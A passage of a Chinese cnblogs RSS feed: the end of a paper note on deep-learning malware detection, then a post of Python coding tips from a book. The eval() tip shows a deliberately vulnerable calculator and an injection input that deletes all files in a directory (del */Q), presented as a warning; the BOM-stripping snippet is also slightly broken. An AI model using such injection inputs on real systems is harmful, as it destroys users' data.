&lt;p&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_RNN-Cond.png&quot; width=&quot;650&quot; alt=&quot;RNN-Cond&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_CNN-Cond.png&quot; width=&quot;650&quot; alt=&quot;CNN-Cond&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://www.cnblogs.com/images/cnblogs_com/BYRans/761498/o_malDecScore.png&quot; width=&quot;650&quot; alt=&quot;malDecScore&quot;/&gt;&lt;/p&gt;


&lt;p&gt;在恶意程序检测方向，将程序的动静态数据转为图像，再套用CNN对图像分类，这是一个常见的思路。&lt;/p&gt;
&lt;h2 id=&quot;本论文值得学习的点&quot;&gt;本论文值得学习的点&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;使用RNN把保留了程序行为的时序特征&lt;/li&gt;
&lt;li&gt;提供了一种将程序行为日志转为图像的思路&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;不足之处&quot;&gt;不足之处&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;实验数据集太少&lt;/li&gt;
&lt;li&gt;在公开沙箱中生成的恶意软件行为日志，可能存在对抗&lt;/li&gt;
&lt;li&gt;没有公开数据集&lt;/li&gt;
&lt;li&gt;行为类型太少&lt;/li&gt;
&lt;li&gt;只用了程序的动态数据，没有使用静态数据&lt;/li&gt;
&lt;/ul&gt;
</description>
<pubDate>Fri, 18 Jan 2019 14:07:00 +0000</pubDate>
<dc:creator>BYRans</dc:creator>
<og:description>【论文笔记】Malware Detection with Deep Neural Network Using Process Behavior 论文基本信息 会议： IEEE（2016 IEEE 40</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/BYRans/p/10289938.html</dc:identifier>
</item>
<item>
<title>python编程规范系列--建议08～18 - 天堂的鸽子</title>
<link>http://www.cnblogs.com/zhangbc/p/10289870.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhangbc/p/10289870.html</guid>
<description>&lt;h4&gt;　　&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;本系列来自《编写高质量代码 改善python程序的91个建议》的读书笔记整理。&lt;br/&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt; 　 &lt;/span&gt;&lt;span&gt;本章主要内容&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;23&quot;&gt;
&lt;p&gt;建议8：利用assert语句来发现问题&lt;/p&gt;
&lt;p&gt;建议9：数据交换值时不推荐使用中间交换变量&lt;/p&gt;
&lt;p&gt;建议10：充分利用Lazy evaluation的特性&lt;/p&gt;
&lt;p&gt;建议11：理解枚举替代实现的缺陷&lt;/p&gt;
&lt;p&gt;建议12：不推荐使用type来进行类型检查&lt;/p&gt;
&lt;p&gt;建议13：尽量转换为浮点类型再做除法&lt;/p&gt;
&lt;p&gt;建议14：警惕eval()的安全漏洞&lt;/p&gt;
&lt;p&gt;建议15：使用enumerate()获取序列迭代的索引和值&lt;/p&gt;
&lt;p&gt;建议16：分清==与is的适用场景&lt;/p&gt;
&lt;p&gt;建议17：考虑兼容性，尽可能使用Unicod&lt;/p&gt;
&lt;div readability=&quot;6&quot;&gt;
&lt;div readability=&quot;7&quot;&gt;
&lt;p&gt;建议18：构建合理的包层次来管理module&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;h4&gt;建议8：利用assert语句来发现问题&lt;/h4&gt;
&lt;p&gt;    1）__debug__的值默认为True，且只读，无法修改(py2.7)。&lt;/p&gt;
&lt;p&gt;    2）断言是有代价的，对性能产生一定影响。禁用断言的方法是在运行脚本的时候加上&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;&lt;strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;-O&lt;/span&gt;&lt;/strong&gt;标记(不优化字节码，而是忽略与断言相关的语句)。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;    &lt;span&gt;使用断言注意点：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;    1）不要滥用，这是使用断言的最基本的原则；&lt;/p&gt;
&lt;p&gt;    2）如果Python本身的异常能够处理就不要再使用断言；&lt;/p&gt;
&lt;p&gt;    3）不要使用断言来检查用户的输入；&lt;/p&gt;
&lt;p&gt;    4）在函数调用后，当需要确认返回值是否合理时可以使用断言；&lt;/p&gt;
&lt;p&gt;    5）当条件时业务逻辑继续下去的先决条件时，可以使用断言。&lt;/p&gt;
&lt;h4&gt;建议9：数据交换值时不推荐使用中间交换变量&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;from&lt;/span&gt; timeit &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Timer
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; Timer(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;temp=x;x=y;y=temp&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;x=2;y=3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).timeit()
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; 0.03472399711608887
&lt;span&gt;4&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; Timer(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;x,y=y,x&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;x=2;y=3&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).timeit()
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; 0.031581878662109375
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;建议10：充分利用Lazy evaluation的特性&lt;/h4&gt;
&lt;p&gt;    Lazy evaluation常被译作“延时计算”或“惰性计算”，指的是仅仅在真正需要执行计算的时候才计算表达式的值。&lt;span&gt;典型例子&lt;/span&gt;：生成器表达式。&lt;/p&gt;
&lt;p&gt;    1）避免不必要的计算，带来性能上的提升；&lt;/p&gt;
&lt;p&gt;    2）节省空间，使用无限循环的数据结构成为可能。&lt;/p&gt;
&lt;h4&gt;建议11：理解枚举替代实现的缺陷&lt;/h4&gt;
&lt;p&gt;    1）替代方法：使用类属性；借助函数；使用collections.namedtuple.&lt;/p&gt;
&lt;div&gt;
&lt;div readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;from&lt;/span&gt; collections &lt;span&gt;import&lt;/span&gt;&lt;span&gt; namedtuple
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; Seasons=namedtuple(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Seasons&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Spring Summer Autumn Winter&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)._make(xrange(4&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;print&lt;/span&gt;&lt;span&gt; Seasons
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; Seasons(Spring=0, Summer=1, Autumn=2, Winter=3&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;print&lt;/span&gt;&lt;span&gt; Seasons.Autumn
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; 2
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;    2）替代缺陷：允许枚举值重复；支持无意义的操作.&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; Seasons._replace(Spring=2) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 不合理&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; Seasons(Spring=2, Summer=1, Autumn=2, Winter=3&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; Seasons.Summer+Seasons.Autumn == Seasons.Winter &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 无意义&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; True
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;    3）py2.7的替代方案(py3.4后引入Enum类型)：&lt;strong&gt;flufl.enum&lt;/strong&gt;&lt;/p&gt;
&lt;div readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; flufl.enum &lt;span&gt;import&lt;/span&gt;&lt;span&gt; Enum
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Seasons(Enum):
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     Spring = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Spring&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt;     Summer = 2
&lt;span&gt; 7&lt;/span&gt;     Autumn = 3
&lt;span&gt; 8&lt;/span&gt;     Winter = 4
&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; Seasons = Enum(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Seasons&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Spring Summer Autumn Winter&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;print&lt;/span&gt;&lt;span&gt; Seasons
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;print&lt;/span&gt; Seasons.Summer.value    
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;建议12：不推荐使用type来进行类型检查&lt;/h4&gt;
&lt;p&gt;    1）基于内建类型扩展的用户自定义类型，type函数并不能准确返回结果；&lt;/p&gt;
&lt;p&gt;    2）在旧式类中，所有类的实例的type值都相等。&lt;/p&gt;
&lt;p&gt;    3）可以用isinstance()函数检查。&lt;/p&gt;
&lt;h4&gt;建议13：尽量转换为浮点类型再做除法&lt;/h4&gt;
&lt;p&gt;        当涉及除法运算的时候尽量先将操作数转换成浮点类型再做运算。&lt;/p&gt;
&lt;p&gt;        浮点数不精确性导致的无限循环：&lt;/p&gt;
&lt;div readability=&quot;6&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; i=1
&lt;span&gt;2&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;while&lt;/span&gt; i!=1.5&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; ... i=i+0.1
&lt;span&gt;4&lt;/span&gt; ... &lt;span&gt;print&lt;/span&gt; i
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;建议14：警惕eval()的安全漏洞&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; -*-coding:UTF-8 -*-&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; sys
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; math &lt;span&gt;import&lt;/span&gt; *
&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;def&lt;/span&gt;&lt;span&gt; ExpCalcBot(string):
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;try&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Your answer is&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, eval(string)
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;except&lt;/span&gt;&lt;span&gt; NameError:
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;The expression you enter is not valid.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt; 
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; True:
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;print&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Please enter a number or operation. Enter e to complete. &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;     inputStr =&lt;span&gt; raw_input()
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; inputStr == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;e&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        sys.exit()
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;elif&lt;/span&gt; repr(inputStr) != &lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;         ExpCalcBot(inputStr)
&lt;/pre&gt;&lt;/div&gt;
&lt;div readability=&quot;6&quot;&gt;
&lt;div readability=&quot;7&quot;&gt;
&lt;p class=&quot;L0&quot;&gt;输入：&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;&lt;strong&gt;__import__(&quot;os&quot;).system(&quot;dir&quot;)&lt;/strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;   显示当前目录下的所有文件.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;        &lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;&lt;strong&gt;__import__(&quot;os&quot;).system(&quot;del */Q&quot;)&lt;/strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;   删除当前目录下的所有文件.&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;        因此，在实际应用过程中国呢如果使用对象不是信任源，应该尽量避免使用eval，在需要使用eval的地方可以用安全性更好的ast.literal_eval替代。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;建议15：使用enumerate()获取序列迭代的索引和值&lt;/h4&gt;
&lt;p&gt;        注意，在获取迭代过程中字典的key和value，应该使用如下iteritems()方法。&lt;/p&gt;
&lt;div&gt;
&lt;div readability=&quot;9&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; person={&lt;span&gt;'&lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Josn&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;age&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: 19, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hobby&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;football&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;}
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; &lt;span&gt;for&lt;/span&gt; k,v &lt;span&gt;in&lt;/span&gt;&lt;span&gt; person.iteritems():
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; ... &lt;span&gt;print&lt;/span&gt; k, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, v
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;建议16：分清==与is的适用场景&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hi&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; b=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Hi&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a &lt;span&gt;is&lt;/span&gt;&lt;span&gt; b
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;True
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a==&lt;span&gt;b
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;True
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a1 =&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I am using long string for testing&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 注意区分&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; b1 =&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I am using long string for testing&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a1 &lt;span&gt;is&lt;/span&gt;&lt;span&gt; b1
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;False
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &amp;gt;&amp;gt;&amp;gt; a1==&lt;span&gt;b1
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; True
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/577562/201901/577562-20190118213910375-1491653201.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div&gt;
&lt;div&gt;
&lt;div&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;    is：表示的是对象标识符，检查对象的标识符是否一致，也就是比较两个对象在内存中是否拥有同一块内存空间；&lt;/p&gt;
&lt;p&gt;    ==：表示的是值相等，用来判断两个对象的值是否相等，可以被重载。&lt;/p&gt;
&lt;p&gt;   &lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;span&gt;&lt;strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;字符串驻留(string interning)机制&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;：对于较小的字符串，为了提高系统性能会保留其值的一个副本，当创建新的字符串时直接指向该副本即可。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;建议17：考虑兼容性，尽可能使用Unicode&lt;/h4&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;    python内建的字符串有两种类型：str和Unicode，共同祖先为basestring。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;    windows本地默认编码是CP936。&lt;/span&gt;&lt;/p&gt;
&lt;div&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/577562/201901/577562-20190118214059637-689233848.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div&gt;
&lt;div&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;   &lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;解码：str.decode（[编码参数[，错误处理]]）&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt;  &lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;   &lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;strong&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;编码：str.encode&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;（[编码参数[，错误处理]]）&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;    错误处理参数有3种方式：&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;        （1）strict：默认值，抛出UnicodeError异常；&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;        （2）ignore：忽略不可转换的字符；&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;        （3）replace：将不可转换字符用？代替。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span data-wiz-span=&quot;data-wiz-span&quot;&gt;    有些软件在保存UTF-8编码时，会在文件最开始地方插入不可见的BOM，可以利用codecs解决。&lt;/span&gt;&lt;/p&gt;
&lt;div readability=&quot;7&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; codecs
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
&lt;span&gt;3&lt;/span&gt; 
&lt;span&gt;4&lt;/span&gt; content = open(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;manage.py&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).read()
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; 
&lt;span&gt;6&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; content[:3] ==&lt;span&gt; codecs.BOM_UTF8:
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;     content = content[:3&lt;span&gt;]
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; 
&lt;span&gt;9&lt;/span&gt; &lt;span&gt;print&lt;/span&gt; content.decode(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div readability=&quot;19&quot;&gt;
&lt;p&gt;    编码声明的三种方式：&lt;/p&gt;
&lt;div readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; coding=&amp;lt;encoding name&amp;gt; #方式一&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env python&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt; 
&lt;span&gt;4&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; -*- coding:&amp;lt;encoding name&amp;gt; -*- #方式二&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt; 
&lt;span&gt;6&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt;!/usr/bin/env python&lt;/span&gt;
&lt;span&gt;7&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; vim:set fileencoding=&amp;lt;encoding name&amp;gt; #方式三&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;建议18：构建合理的包层次来管理module&lt;/h4&gt;
&lt;p&gt;    包中__init__.py文件的作用：1)使包和普通目录区分；&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　　2)在该文件中声明模块级别的import语句从而使其变成包级别可见；&lt;/p&gt;
&lt;p&gt;　　　　　　　　　　　　　　3)通过该文件中定义__all__变量，控制需要导入的子包或者模块。&lt;br/&gt;    使用包的好处：&lt;/p&gt;
&lt;p&gt;    1）合理组织代码，便于维护和使用；&lt;/p&gt;
&lt;p&gt;    2）能够有效地避免名称空间冲突。&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Fri, 18 Jan 2019 13:44:00 +0000</pubDate>
<dc:creator>天堂的鸽子</dc:creator>
<og:description>本系列来自《编写高质量代码 改善python程序的91个建议》的读书笔记整理。python编程规范系列--建议08～18</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhangbc/p/10289870.html</dc:identifier>
</item>
</channel>
</rss>